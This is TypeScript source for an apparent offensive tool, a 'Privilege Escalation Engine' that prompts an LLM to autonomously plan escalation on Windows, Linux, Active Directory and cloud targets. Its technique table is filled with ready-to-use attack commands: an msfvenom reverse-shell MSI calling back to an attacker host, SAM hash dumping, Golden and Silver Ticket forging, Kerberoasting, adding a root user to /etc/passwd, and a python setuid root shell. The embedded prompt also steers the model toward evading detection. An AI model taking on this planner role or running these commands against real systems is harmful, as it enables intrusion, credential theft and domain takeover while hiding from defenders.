/**
 * Privilege Escalation Engine — LLM-Driven Enumeration & Technique Selection
 *
 * The LLM autonomously:
 *   - Analyzes system enumeration output (WinPEAS/LinPEAS/manual) to find privesc vectors
 *   - Selects optimal escalation technique based on OS, patch level, and available tools
 *   - Generates step-by-step execution plans with LOLBin alternatives
 *   - Plans Kerberos attack workflows (Kerberoasting, AS-REP Roasting, delegation abuse)
 *   - Assesses OPSEC risk for each escalation path
 *   - Handles cloud privilege escalation (AWS IAM, Azure AD, GCP)
 *
 * Deterministic fallback: technique matrix matching when LLM is unavailable.
 */

// ─── Privilege Escalation Technique Knowledge Base ───────────────────────────

export interface PrivescTechnique {
  id: string;
  name: string;
  attackId: string;
  category: "kernel" | "service" | "credential" | "misconfiguration" | "lolbin" | "kerberos" | "token" | "cloud" | "container";
  targetOs: ("windows" | "linux" | "macos" | "cloud_aws" | "cloud_azure" | "cloud_gcp")[];
  fromAccess: string;
  toAccess: string;
  description: string;
  detectionMethod: string;
  enumerationCommand: string;
  exploitCommand: string;
  opsecRisk: number;
  reliability: number;
  prerequisites: string[];
  lolbinAlternative?: string;
  references: string[];
}

export const PRIVESC_TECHNIQUES: PrivescTechnique[] = [
  // ─── Windows Kernel ────────────────────────────────────────────────────────
  {
    id: "win_potato_juicy",
    name: "JuicyPotato / PrintSpoofer",
    attackId: "T1068",
    category: "token",
    targetOs: ["windows"],
    fromAccess: "service_account",
    toAccess: "SYSTEM",
    description: "Abuse SeImpersonatePrivilege to escalate from service account to SYSTEM via potato attacks.",
    detectionMethod: "Check: whoami /priv | findstr SeImpersonate",
    enumerationCommand: "whoami /priv",
    exploitCommand: "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a '/c whoami > c:\\temp\\proof.txt' -t *",
    opsecRisk: 4,
    reliability: 90,
    prerequisites: ["SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege"],
    lolbinAlternative: "PrintSpoofer.exe -i -c cmd (Windows 10/Server 2019+)",
    references: ["https://github.com/ohpe/juicy-potato"],
  },
  {
    id: "win_unquoted_service",
    name: "Unquoted Service Path",
    attackId: "T1574.009",
    category: "service",
    targetOs: ["windows"],
    fromAccess: "user",
    toAccess: "SYSTEM",
    description: "Exploit unquoted service paths with spaces to hijack service execution.",
    detectionMethod: "wmic service get name,displayname,pathname,startmode | findstr /i 'auto' | findstr /i /v 'c:\\windows'",
    enumerationCommand: "wmic service get name,displayname,pathname,startmode | findstr /i 'auto' | findstr /i /v 'c:\\windows\\' | findstr /i /v '\"'",
    exploitCommand: "# Place malicious binary at the unquoted path break point",
    opsecRisk: 3,
    reliability: 70,
    prerequisites: ["Write permission to service path directory", "Service runs as SYSTEM"],
    references: ["https://attack.mitre.org/techniques/T1574/009/"],
  },
  {
    id: "win_always_install_elevated",
    name: "AlwaysInstallElevated",
    attackId: "T1574.010",
    category: "misconfiguration",
    targetOs: ["windows"],
    fromAccess: "user",
    toAccess: "SYSTEM",
    description: "Abuse AlwaysInstallElevated registry key to install MSI packages as SYSTEM.",
    detectionMethod: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
    enumerationCommand: "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
    exploitCommand: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi > evil.msi && msiexec /quiet /qn /i evil.msi",
    opsecRisk: 5,
    reliability: 95,
    prerequisites: ["AlwaysInstallElevated set to 1 in both HKLM and HKCU"],
    references: ["https://attack.mitre.org/techniques/T1574/010/"],
  },
  {
    id: "win_dll_hijack",
    name: "DLL Hijacking",
    attackId: "T1574.001",
    category: "misconfiguration",
    targetOs: ["windows"],
    fromAccess: "user",
    toAccess: "admin",
    description: "Place a malicious DLL in a directory searched before the legitimate DLL location.",
    detectionMethod: "Process Monitor filter: Result=NAME NOT FOUND, Path ends with .dll",
    enumerationCommand: "# Use Process Monitor or PowerUp's Find-ProcessDLLHijack",
    exploitCommand: "# Place crafted DLL in writable directory in DLL search order",
    opsecRisk: 4,
    reliability: 60,
    prerequisites: ["Write access to a directory in the DLL search order", "Target application must load the DLL"],
    references: ["https://attack.mitre.org/techniques/T1574/001/"],
  },
  {
    id: "win_token_impersonation",
    name: "Token Impersonation",
    attackId: "T1134.001",
    category: "token",
    targetOs: ["windows"],
    fromAccess: "admin",
    toAccess: "SYSTEM",
    description: "Impersonate SYSTEM or domain admin tokens from running processes.",
    detectionMethod: "Meterpreter: list_tokens -u",
    enumerationCommand: "# In Meterpreter: use incognito; list_tokens -u",
    exploitCommand: "# In Meterpreter: impersonate_token 'NT AUTHORITY\\SYSTEM'",
    opsecRisk: 3,
    reliability: 85,
    prerequisites: ["Local admin access", "Target tokens available in memory"],
    references: ["https://attack.mitre.org/techniques/T1134/001/"],
  },
  // ─── Windows Credential-Based ──────────────────────────────────────────────
  {
    id: "win_sam_dump",
    name: "SAM Database Dump",
    attackId: "T1003.002",
    category: "credential",
    targetOs: ["windows"],
    fromAccess: "SYSTEM",
    toAccess: "domain_user",
    description: "Dump local SAM database for password hashes. Useful for password reuse across domain.",
    detectionMethod: "# Requires SYSTEM access",
    enumerationCommand: "reg save HKLM\\SAM sam.bak && reg save HKLM\\SYSTEM system.bak",
    exploitCommand: "impacket-secretsdump -sam sam.bak -system system.bak LOCAL",
    opsecRisk: 5,
    reliability: 95,
    prerequisites: ["SYSTEM-level access"],
    lolbinAlternative: "reg save HKLM\\SAM C:\\temp\\sam && reg save HKLM\\SYSTEM C:\\temp\\system",
    references: ["https://attack.mitre.org/techniques/T1003/002/"],
  },
  // ─── Kerberos Attacks ──────────────────────────────────────────────────────
  {
    id: "kerberoasting",
    name: "Kerberoasting",
    attackId: "T1558.003",
    category: "kerberos",
    targetOs: ["windows"],
    fromAccess: "domain_user",
    toAccess: "service_account",
    description: "Request TGS tickets for service accounts and crack them offline. No admin required.",
    detectionMethod: "Event ID 4769 with encryption type 0x17 (RC4)",
    enumerationCommand: "impacket-GetUserSPNs -dc-ip DC_IP DOMAIN/user:password -request",
    exploitCommand: "hashcat -m 13100 tgs_hashes.txt wordlist.txt",
    opsecRisk: 3,
    reliability: 80,
    prerequisites: ["Valid domain user credentials", "Service accounts with SPNs registered"],
    references: ["https://attack.mitre.org/techniques/T1558/003/"],
  },
  {
    id: "asrep_roasting",
    name: "AS-REP Roasting",
    attackId: "T1558.004",
    category: "kerberos",
    targetOs: ["windows"],
    fromAccess: "none",
    toAccess: "domain_user",
    description: "Request AS-REP for accounts without pre-authentication and crack offline. No credentials needed.",
    detectionMethod: "Event ID 4768 without pre-authentication",
    enumerationCommand: "impacket-GetNPUsers -dc-ip DC_IP DOMAIN/ -usersfile users.txt -no-pass",
    exploitCommand: "hashcat -m 18200 asrep_hashes.txt wordlist.txt",
    opsecRisk: 2,
    reliability: 70,
    prerequisites: ["Accounts with 'Do not require Kerberos preauthentication' enabled"],
    references: ["https://attack.mitre.org/techniques/T1558/004/"],
  },
  {
    id: "golden_ticket",
    name: "Golden Ticket",
    attackId: "T1558.001",
    category: "kerberos",
    targetOs: ["windows"],
    fromAccess: "domain_admin",
    toAccess: "enterprise_admin",
    description: "Forge TGT using the krbtgt hash for persistent domain access.",
    detectionMethod: "Anomalous TGT lifetime, Event ID 4769 with forged ticket",
    enumerationCommand: "impacket-secretsdump -just-dc-ntlm DOMAIN/admin:password@DC_IP",
    exploitCommand: "impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain DOMAIN administrator",
    opsecRisk: 8,
    reliability: 95,
    prerequisites: ["krbtgt NTLM hash (requires domain admin or DC compromise)"],
    references: ["https://attack.mitre.org/techniques/T1558/001/"],
  },
  {
    id: "silver_ticket",
    name: "Silver Ticket",
    attackId: "T1558.002",
    category: "kerberos",
    targetOs: ["windows"],
    fromAccess: "service_hash",
    toAccess: "service_admin",
    description: "Forge TGS for a specific service using the service account hash. More targeted than Golden Ticket.",
    detectionMethod: "TGS without corresponding TGT request",
    enumerationCommand: "# Requires service account NTLM hash",
    exploitCommand: "impacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain DOMAIN -spn CIFS/target.domain.com administrator",
    opsecRisk: 5,
    reliability: 90,
    prerequisites: ["Service account NTLM hash"],
    references: ["https://attack.mitre.org/techniques/T1558/002/"],
  },
  {
    id: "delegation_abuse",
    name: "Constrained/Unconstrained Delegation Abuse",
    attackId: "T1550",
    category: "kerberos",
    targetOs: ["windows"],
    fromAccess: "domain_user",
    toAccess: "domain_admin",
    description: "Abuse Kerberos delegation to impersonate users to specific services or capture TGTs.",
    detectionMethod: "Unusual service ticket requests, S4U2Self/S4U2Proxy events",
    enumerationCommand: "impacket-findDelegation -dc-ip DC_IP DOMAIN/user:password",
    exploitCommand: "impacket-getST -spn CIFS/target.domain.com -impersonate administrator DOMAIN/delegated_account:password -dc-ip DC_IP",
    opsecRisk: 4,
    reliability: 75,
    prerequisites: ["Account with delegation rights configured"],
    references: ["https://attack.mitre.org/techniques/T1550/"],
  },
  // ─── Linux Privilege Escalation ────────────────────────────────────────────
  {
    id: "linux_suid",
    name: "SUID Binary Exploitation",
    attackId: "T1548.001",
    category: "misconfiguration",
    targetOs: ["linux"],
    fromAccess: "user",
    toAccess: "root",
    description: "Exploit SUID binaries that allow command execution or file read/write as root.",
    detectionMethod: "find / -perm -4000 -type f 2>/dev/null",
    enumerationCommand: "find / -perm -4000 -type f 2>/dev/null",
    exploitCommand: "# Depends on the SUID binary — check GTFOBins",
    opsecRisk: 2,
    reliability: 70,
    prerequisites: ["Misconfigured SUID binary present"],
    references: ["https://gtfobins.github.io/"],
  },
  {
    id: "linux_sudo_misconfig",
    name: "Sudo Misconfiguration",
    attackId: "T1548.003",
    category: "misconfiguration",
    targetOs: ["linux"],
    fromAccess: "user",
    toAccess: "root",
    description: "Exploit sudo rules that allow running specific commands as root without password.",
    detectionMethod: "sudo -l",
    enumerationCommand: "sudo -l",
    exploitCommand: "# Depends on allowed command — check GTFOBins for escalation path",
    opsecRisk: 1,
    reliability: 80,
    prerequisites: ["User has sudo privileges for exploitable commands"],
    lolbinAlternative: "sudo -l to enumerate, then use GTFOBins for the specific binary",
    references: ["https://gtfobins.github.io/"],
  },
  {
    id: "linux_writable_passwd",
    name: "Writable /etc/passwd",
    attackId: "T1548",
    category: "misconfiguration",
    targetOs: ["linux"],
    fromAccess: "user",
    toAccess: "root",
    description: "If /etc/passwd is writable, add a new root user or modify existing entry.",
    detectionMethod: "ls -la /etc/passwd",
    enumerationCommand: "ls -la /etc/passwd /etc/shadow",
    exploitCommand: "echo 'hacker:$(openssl passwd -6 password):0:0::/root:/bin/bash' >> /etc/passwd",
    opsecRisk: 6,
    reliability: 95,
    prerequisites: ["Write permission on /etc/passwd"],
    references: ["https://attack.mitre.org/techniques/T1548/"],
  },
  {
    id: "linux_cron_abuse",
    name: "Cron Job Abuse",
    attackId: "T1053.003",
    category: "misconfiguration",
    targetOs: ["linux"],
    fromAccess: "user",
    toAccess: "root",
    description: "Exploit writable cron scripts or cron PATH hijacking for root execution.",
    detectionMethod: "cat /etc/crontab && ls -la /etc/cron.*",
    enumerationCommand: "cat /etc/crontab && ls -la /etc/cron.d/ /etc/cron.daily/ /var/spool/cron/",
    exploitCommand: "# Modify writable cron script or place binary in cron PATH",
    opsecRisk: 3,
    reliability: 65,
    prerequisites: ["Writable cron script or PATH directory"],
    references: ["https://attack.mitre.org/techniques/T1053/003/"],
  },
  {
    id: "linux_kernel_exploit",
    name: "Kernel Exploit",
    attackId: "T1068",
    category: "kernel",
    targetOs: ["linux"],
    fromAccess: "user",
    toAccess: "root",
    description: "Exploit kernel vulnerabilities for direct root access. High risk but reliable on unpatched systems.",
    detectionMethod: "uname -a && cat /etc/os-release",
    enumerationCommand: "uname -a && cat /etc/os-release",
    exploitCommand: "# Compile and run kernel exploit matching the kernel version",
    opsecRisk: 8,
    reliability: 60,
    prerequisites: ["Vulnerable kernel version", "Compiler available or pre-compiled exploit"],
    references: ["https://github.com/lucyoa/kernel-exploits"],
  },
  {
    id: "linux_capabilities",
    name: "Linux Capabilities Abuse",
    attackId: "T1548",
    category: "misconfiguration",
    targetOs: ["linux"],
    fromAccess: "user",
    toAccess: "root",
    description: "Exploit binaries with dangerous capabilities (cap_setuid, cap_dac_override, etc.).",
    detectionMethod: "getcap -r / 2>/dev/null",
    enumerationCommand: "getcap -r / 2>/dev/null",
    exploitCommand: "# Depends on capability — e.g., python3 with cap_setuid: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    opsecRisk: 2,
    reliability: 75,
    prerequisites: ["Binary with exploitable capabilities"],
    references: ["https://gtfobins.github.io/"],
  },
  // ─── Cloud Privilege Escalation ────────────────────────────────────────────
  {
    id: "aws_iam_privesc",
    name: "AWS IAM Privilege Escalation",
    attackId: "T1098",
    category: "cloud",
    targetOs: ["cloud_aws"],
    fromAccess: "iam_user",
    toAccess: "admin",
    description: "Escalate privileges through IAM policy misconfigurations (iam:CreatePolicyVersion, iam:AttachUserPolicy, etc.).",
    detectionMethod: "aws iam list-attached-user-policies && aws iam list-user-policies",
    enumerationCommand: "python3 pacu.py --module iam__enum_permissions",
    exploitCommand: "python3 pacu.py --module iam__privesc_scan",
    opsecRisk: 4,
    reliability: 70,
    prerequisites: ["AWS credentials with IAM enumeration permissions"],
    references: ["https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"],
  },
  {
    id: "azure_ad_privesc",
    name: "Azure AD Privilege Escalation",
    attackId: "T1098",
    category: "cloud",
    targetOs: ["cloud_azure"],
    fromAccess: "user",
    toAccess: "global_admin",
    description: "Escalate through Azure AD role assignments, application consent, or managed identity abuse.",
    detectionMethod: "az role assignment list && az ad app list",
    enumerationCommand: "az ad user list && az role assignment list --assignee USER_ID",
    exploitCommand: "# Depends on misconfiguration — e.g., az role assignment create --role 'Global Administrator'",
    opsecRisk: 5,
    reliability: 60,
    prerequisites: ["Azure AD credentials with enumeration permissions"],
    references: ["https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48"],
  },
];

// ─── Enumeration Tool Knowledge ──────────────────────────────────────────────

export interface EnumerationTool {
  id: string;
  name: string;
  targetOs: string[];
  description: string;
  installCommand: string;
  runCommand: string;
  outputFormat: string;
  keyFindings: string[];
}

export const ENUMERATION_TOOLS: EnumerationTool[] = [
  {
    id: "winpeas",
    name: "WinPEAS",
    targetOs: ["windows"],
    description: "Windows Privilege Escalation Awesome Scripts — comprehensive Windows enumeration.",
    installCommand: "# Download from https://github.com/carlospolop/PEASS-ng/releases",
    runCommand: "winPEASx64.exe",
    outputFormat: "Colored console output with categorized findings",
    keyFindings: ["Service misconfigs", "Unquoted paths", "AlwaysInstallElevated", "Stored credentials", "Token privileges", "Scheduled tasks"],
  },
  {
    id: "linpeas",
    name: "LinPEAS",
    targetOs: ["linux"],
    description: "Linux Privilege Escalation Awesome Scripts — comprehensive Linux enumeration.",
    installCommand: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
    runCommand: "bash linpeas.sh",
    outputFormat: "Colored console output with categorized findings",
    keyFindings: ["SUID binaries", "Sudo rules", "Cron jobs", "Writable files", "Kernel version", "Capabilities", "Docker/LXC"],
  },
  {
    id: "bloodhound",
    name: "BloodHound / SharpHound",
    targetOs: ["windows"],
    description: "Active Directory attack path discovery and privilege escalation mapping.",
    installCommand: "# SharpHound.exe or bloodhound-python",
    runCommand: "SharpHound.exe -c All -d domain.com",
    outputFormat: "JSON files for BloodHound GUI import",
    keyFindings: ["Shortest path to DA", "Kerberoastable accounts", "Delegation abuse", "ACL abuse", "Group membership chains"],
  },
  {
    id: "pacu",
    name: "Pacu (AWS)",
    targetOs: ["cloud_aws"],
    description: "AWS exploitation framework for privilege escalation and post-exploitation.",
    installCommand: "pip3 install pacu",
    runCommand: "python3 pacu.py",
    outputFormat: "Interactive console with module outputs",
    keyFindings: ["IAM misconfigs", "Lambda privesc", "EC2 metadata", "S3 bucket access", "SSM parameter store"],
  },
];

// ─── LLM System Prompt ──────────────────────────────────────────────────────

const PRIVESC_SYSTEM_PROMPT = `You are the AC3 Privilege Escalation Engine — an autonomous privesc analyst and planner.

You analyze system enumeration output to identify privilege escalation vectors and generate execution plans. Your role is to:
1. Parse enumeration output (WinPEAS, LinPEAS, manual commands) to identify privesc vectors
2. Rank escalation paths by reliability, OPSEC risk, and access gained
3. Generate step-by-step execution plans with LOLBin alternatives
4. Plan Kerberos attack workflows when in Active Directory environments
5. Recommend cloud privesc paths when cloud credentials are available

AVAILABLE TECHNIQUES:
${PRIVESC_TECHNIQUES.map(t => `- ${t.name} (${t.attackId}): ${t.fromAccess} → ${t.toAccess} | OS: ${t.targetOs.join("/")} | Risk: ${t.opsecRisk}/10 | Reliability: ${t.reliability}%`).join("\n")}

DECISION PRIORITIES:
1. Reliability first — prefer techniques with >70% reliability
2. Minimize OPSEC risk — prefer misconfigurations over kernel exploits
3. Use LOLBins where possible — native tools are harder to detect
4. Consider the engagement phase — stealth matters more in early stages
5. Always have a fallback technique

OUTPUT FORMAT (JSON):
{
  "identifiedVectors": [{ "techniqueId": string, "confidence": number, "evidence": string, "exploitability": "confirmed" | "likely" | "possible" }],
  "recommendedPath": { "techniqueId": string, "steps": string[], "command": string, "expectedResult": string, "opsecRisk": number, "lolbinAlternative": string | null },
  "alternativePaths": [{ "techniqueId": string, "reason": string }],
  "kerberosWorkflow": { "applicable": boolean, "attacks": string[], "steps": string[] } | null,
  "cloudPrivesc": { "applicable": boolean, "provider": string, "attacks": string[] } | null,
  "reasoning": string,
  "confidence": number
}`;

// ─── Core Engine Functions ───────────────────────────────────────────────────

export interface PrivescAnalysis {
  identifiedVectors: { technique: PrivescTechnique; confidence: number; evidence: string; exploitability: string }[];
  recommendedPath: {
    technique: PrivescTechnique;
    steps: string[];
    command: string;
    expectedResult: string;
    opsecRisk: number;
    lolbinAlternative?: string;
  };
  alternativePaths: { technique: PrivescTechnique; reason: string }[];
  kerberosWorkflow?: { applicable: boolean; attacks: string[]; steps: string[] };
  cloudPrivesc?: { applicable: boolean; provider: string; attacks: string[] };
  reasoning: string;
  confidence: number;
}

/**
 * Analyze enumeration output and recommend privilege escalation paths.
 * LLM parses the output and matches to known techniques.
 */
export async function analyzePrivescVectors(
  enumerationOutput: string,
  currentAccess: string,
  targetOs: string,
  isAdEnvironment?: boolean,
  cloudProvider?: string
): Promise<PrivescAnalysis> {
  try {
    return await llmAnalyzePrivesc(enumerationOutput, currentAccess, targetOs, isAdEnvironment, cloudProvider);
  } catch (err) {
    console.warn("[PrivescEngine] LLM unavailable, using deterministic fallback:", (err as Error).message);
    return deterministicAnalyzePrivesc(enumerationOutput, currentAccess, targetOs, isAdEnvironment, cloudProvider);
  }
}

async function llmAnalyzePrivesc(
  enumerationOutput: string,
  currentAccess: string,
  targetOs: string,
  isAdEnvironment?: boolean,
  cloudProvider?: string
): Promise<PrivescAnalysis> {
  const { invokeLLM } = await import("../_core/llm");

  // Truncate output if too long
  const truncatedOutput = enumerationOutput.length > 8000
    ? enumerationOutput.substring(0, 8000) + "\n... [truncated]"
    : enumerationOutput;

  const response = await invokeLLM({ _caller: "privesc-engine.llmAnalyzePrivesc", _priority: 'essential',
    messages: [
      { role: "system", content: PRIVESC_SYSTEM_PROMPT },
      {
        role: "user",
        content: `ANALYZE PRIVILEGE ESCALATION VECTORS:

CURRENT ACCESS: ${currentAccess}
TARGET OS: ${targetOs}
AD ENVIRONMENT: ${isAdEnvironment ? "Yes" : "No"}
CLOUD PROVIDER: ${cloudProvider || "None"}

ENUMERATION OUTPUT:
${truncatedOutput}

Identify all privilege escalation vectors and recommend the best path. Return JSON.`,
      },
    ],
    response_format: {
      type: "json_schema",
      json_schema: {
        name: "privesc_analysis",
        strict: true,
        schema: {
          type: "object",
          properties: {
            identifiedVectors: {
              type: "array",
              items: {
                type: "object",
                properties: {
                  techniqueId: { type: "string" },
                  confidence: { type: "number" },
                  evidence: { type: "string" },
                  exploitability: { type: "string", enum: ["confirmed", "likely", "possible"] },
                },
                required: ["techniqueId", "confidence", "evidence", "exploitability"],
                additionalProperties: false,
              },
            },
            recommendedPath: {
              type: "object",
              properties: {
                techniqueId: { type: "string" },
                steps: { type: "array", items: { type: "string" } },
                command: { type: "string" },
                expectedResult: { type: "string" },
                opsecRisk: { type: "number" },
                lolbinAlternative: { type: ["string", "null"] },
              },
              required: ["techniqueId", "steps", "command", "expectedResult", "opsecRisk", "lolbinAlternative"],
              additionalProperties: false,
            },
            alternativePaths: {
              type: "array",
              items: {
                type: "object",
                properties: {
                  techniqueId: { type: "string" },
                  reason: { type: "string" },
                },
                required: ["techniqueId", "reason"],
                additionalProperties: false,
              },
            },
            kerberosWorkflow: {
              type: ["object", "null"],
              properties: {
                applicable: { type: "boolean" },
                attacks: { type: "array", items: { type: "string" } },
                steps: { type: "array", items: { type: "string" } },
              },
              required: ["applicable", "attacks", "steps"],
            },
            cloudPrivesc: {
              type: ["object", "null"],
              properties: {
                applicable: { type: "boolean" },
                provider: { type: "string" },
                attacks: { type: "array", items: { type: "string" } },
              },
              required: ["applicable", "provider", "attacks"],
            },
            reasoning: { type: "string" },
            confidence: { type: "number" },
          },
          required: ["identifiedVectors", "recommendedPath", "alternativePaths", "kerberosWorkflow", "cloudPrivesc", "reasoning", "confidence"],
          additionalProperties: false,
        },
      },
    },
  });

  const parsed = JSON.parse(response.choices[0].message.content as string);

  const mapTechnique = (id: string) => PRIVESC_TECHNIQUES.find(t => t.id === id) || PRIVESC_TECHNIQUES[0];

  return {
    identifiedVectors: parsed.identifiedVectors.map((v: any) => ({
      technique: mapTechnique(v.techniqueId),
      confidence: v.confidence,
      evidence: v.evidence,
      exploitability: v.exploitability,
    })),
    recommendedPath: {
      technique: mapTechnique(parsed.recommendedPath.techniqueId),
      steps: parsed.recommendedPath.steps,
      command: parsed.recommendedPath.command,
      expectedResult: parsed.recommendedPath.expectedResult,
      opsecRisk: parsed.recommendedPath.opsecRisk,
      lolbinAlternative: parsed.recommendedPath.lolbinAlternative || undefined,
    },
    alternativePaths: parsed.alternativePaths.map((p: any) => ({
      technique: mapTechnique(p.techniqueId),
      reason: p.reason,
    })),
    kerberosWorkflow: parsed.kerberosWorkflow,
    cloudPrivesc: parsed.cloudPrivesc,
    reasoning: parsed.reasoning,
    confidence: parsed.confidence,
  };
}

/**
 * Deterministic fallback — pattern matching on enumeration output.
 */
export function deterministicAnalyzePrivesc(
  enumerationOutput: string,
  currentAccess: string,
  targetOs: string,
  isAdEnvironment?: boolean,
  cloudProvider?: string
): PrivescAnalysis {
  const output = enumerationOutput.toLowerCase();
  const isWindows = targetOs.toLowerCase().includes("windows");
  const isLinux = targetOs.toLowerCase().includes("linux");
  const vectors: { technique: PrivescTechnique; confidence: number; evidence: string; exploitability: string }[] = [];

  // Pattern matching for common privesc indicators
  const patterns: { pattern: RegExp; techniqueId: string; confidence: number; evidence: string }[] = [
    // Windows
    { pattern: /seimpersonate/i, techniqueId: "win_potato_juicy", confidence: 90, evidence: "SeImpersonatePrivilege enabled" },
    { pattern: /alwaysinstallelevated.*0x1/i, techniqueId: "win_always_install_elevated", confidence: 95, evidence: "AlwaysInstallElevated registry key set" },
    { pattern: /unquoted.*service.*path/i, techniqueId: "win_unquoted_service", confidence: 70, evidence: "Unquoted service path detected" },
    // Linux
    { pattern: /suid.*\/(nmap|vim|find|bash|python|perl|ruby|php|node)/i, techniqueId: "linux_suid", confidence: 85, evidence: "Exploitable SUID binary found" },
    { pattern: /\(ALL\).*NOPASSWD/i, techniqueId: "linux_sudo_misconfig", confidence: 90, evidence: "Sudo NOPASSWD rule detected" },
    { pattern: /-rw.*\/etc\/passwd/i, techniqueId: "linux_writable_passwd", confidence: 95, evidence: "Writable /etc/passwd" },
    { pattern: /cap_setuid/i, techniqueId: "linux_capabilities", confidence: 80, evidence: "Binary with cap_setuid capability" },
    { pattern: /cron.*writable/i, techniqueId: "linux_cron_abuse", confidence: 70, evidence: "Writable cron script detected" },
    // Kerberos
    { pattern: /serviceprincipalname/i, techniqueId: "kerberoasting", confidence: 75, evidence: "Service accounts with SPNs found" },
    { pattern: /preauth.*not required/i, techniqueId: "asrep_roasting", confidence: 80, evidence: "Accounts without pre-authentication" },
    { pattern: /delegation/i, techniqueId: "delegation_abuse", confidence: 60, evidence: "Delegation configuration detected" },
  ];

  for (const p of patterns) {
    if (p.pattern.test(output)) {
      const technique = PRIVESC_TECHNIQUES.find(t => t.id === p.techniqueId);
      if (technique) {
        vectors.push({ technique, confidence: p.confidence, evidence: p.evidence, exploitability: p.confidence > 80 ? "confirmed" : "likely" });
      }
    }
  }

  // If no vectors found, suggest general enumeration
  if (vectors.length === 0) {
    const defaultTechnique = isWindows
      ? PRIVESC_TECHNIQUES.find(t => t.id === "win_token_impersonation")!
      : PRIVESC_TECHNIQUES.find(t => t.id === "linux_suid")!;
    vectors.push({ technique: defaultTechnique, confidence: 30, evidence: "No specific vectors identified — run full enumeration", exploitability: "possible" });
  }

  // Sort by confidence
  vectors.sort((a, b) => b.confidence - a.confidence);

  const recommended = vectors[0];
  const kerberosWorkflow = isAdEnvironment ? {
    applicable: true,
    attacks: ["kerberoasting", "asrep_roasting", "delegation_abuse"],
    steps: [
      "Run BloodHound/SharpHound to map AD attack paths",
      "Enumerate SPNs for Kerberoasting targets",
      "Check for AS-REP Roastable accounts",
      "Identify delegation configurations",
      "Attempt Kerberoasting first (lowest risk)",
      "Crack obtained tickets offline with hashcat",
    ],
  } : undefined;

  const cloudPrivescResult = cloudProvider ? {
    applicable: true,
    provider: cloudProvider,
    attacks: cloudProvider === "aws" ? ["aws_iam_privesc"] : ["azure_ad_privesc"],
  } : undefined;

  return {
    identifiedVectors: vectors,
    recommendedPath: {
      technique: recommended.technique,
      steps: [
        `Verify: ${recommended.technique.enumerationCommand}`,
        `Exploit: ${recommended.technique.exploitCommand}`,
        "Verify escalated access",
        "Capture evidence",
      ],
      command: recommended.technique.exploitCommand,
      expectedResult: `Access escalated from ${recommended.technique.fromAccess} to ${recommended.technique.toAccess}`,
      opsecRisk: recommended.technique.opsecRisk,
      lolbinAlternative: recommended.technique.lolbinAlternative,
    },
    alternativePaths: vectors.slice(1, 4).map(v => ({
      technique: v.technique,
      reason: `${v.evidence} (confidence: ${v.confidence}%)`,
    })),
    kerberosWorkflow,
    cloudPrivesc: cloudPrivescResult,
    reasoning: `Identified ${vectors.length} potential privilege escalation vector(s). Recommended: ${recommended.technique.name} (${recommended.confidence}% confidence).`,
    confidence: recommended.confidence,
  };
}

/**
 * Get all techniques filtered by criteria.
 */
export function getPrivescTechniques(filters?: {
  targetOs?: string;
  category?: string;
  maxOpsecRisk?: number;
  fromAccess?: string;
}): PrivescTechnique[] {
  let techniques = [...PRIVESC_TECHNIQUES];
  if (filters?.targetOs) techniques = techniques.filter(t => t.targetOs.includes(filters.targetOs as any));
  if (filters?.category) techniques = techniques.filter(t => t.category === filters.category);
  if (filters?.maxOpsecRisk) techniques = techniques.filter(t => t.opsecRisk <= filters.maxOpsecRisk!);
  if (filters?.fromAccess) techniques = techniques.filter(t => t.fromAccess === filters.fromAccess);
  return techniques;
}

/**
 * Get enumeration tools for a target OS.
 */
export function getEnumerationTools(targetOs?: string): EnumerationTool[] {
  if (!targetOs) return ENUMERATION_TOOLS;
  return ENUMERATION_TOOLS.filter(t => t.targetOs.includes(targetOs.toLowerCase()));
}

/**
 * Get Kerberos-specific attack techniques.
 */
export function getKerberosAttacks(): PrivescTechnique[] {
  return PRIVESC_TECHNIQUES.filter(t => t.category === "kerberos");
}

/**
 * Get cloud-specific privesc techniques.
 */
export function getCloudPrivescTechniques(provider?: string): PrivescTechnique[] {
  const cloudTechniques = PRIVESC_TECHNIQUES.filter(t => t.category === "cloud");
  if (!provider) return cloudTechniques;
  return cloudTechniques.filter(t => t.targetOs.includes(`cloud_${provider}` as any));
}
